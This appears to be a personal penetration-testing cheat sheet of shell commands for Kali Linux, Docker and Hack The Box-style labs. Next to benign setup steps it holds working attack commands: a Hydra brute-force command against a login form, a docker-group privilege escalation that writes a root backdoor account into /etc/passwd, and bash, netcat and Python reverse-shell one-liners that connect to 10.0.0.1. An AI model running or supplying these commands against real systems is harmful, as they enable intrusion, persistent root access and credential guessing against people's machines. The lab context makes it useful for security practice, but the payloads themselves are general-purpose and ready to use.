### Python simple HTTP server
```Python
python -m SimpleHTTPServer 
```
### Kali Linux assign two network interfaces
Edit `/etc/network/interfaces` and add these lines
```
auto eth0 
iface eth0 inet dhcp 
 
 
auto eth1 
iface eth1 inet dhcp 

```
And then restart the network with following commands.
```bash
systemctl stop networking 
systemctl start networking 
```
### Get interactive bash shell using python
```Python
python -c "import pty;pty.spawn('/bin/bash')"
```
### Get interactive bash shell using OS.System
```
echo os.system('/bin/bash')
```
## Helpful firefox addons
### FoxyProxy
> FoxyProxy is a Firefox extension which automatically switches an internet connection across one or more proxy servers based on URL patterns. Put simply, FoxyProxy automates the manual process of editing Firefox's Connection Settings dialog. Proxy server switching occurs based on the loading URL and the switching rules you define
### Fireforce
> brute-force attacks on GET or POST forms

## Brute-force techniques
### THC Hydra
```bash
# hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
```
## Docker
### Install Docker
#### Add Docker PGP key:

```bash
# curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
```

#### Configure Docker APT repository:

```bash
# echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
```

#### Update APT:

```bash
# apt-get update
```

#### Install Docker

If you had older versions of Docker installed, uninstall them:

```bash
# apt-get remove docker docker-engine docker.io
```
Install Docker:

```bash
# apt-get install docker-ce
```
#### Post Install settings
```bash
# systemctl start docker
# systemctl enable docker
```
#### Testing
```bash
# docker run hello-world
```
### Setup DVWA
```bash
# docker run -d -p 80:80 citizenstig/dvwa
```
## Privilege Escalation
### User part of docker group
You land on a computer and `id` shows you're part of the `docker` group. Escalate to root with:

```bash
$> docker run -it --rm -v $PWD:/mnt bash
```

adds backdoor toor:password
```bash
#> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

## Reverse shell techniques
### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234
```
### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

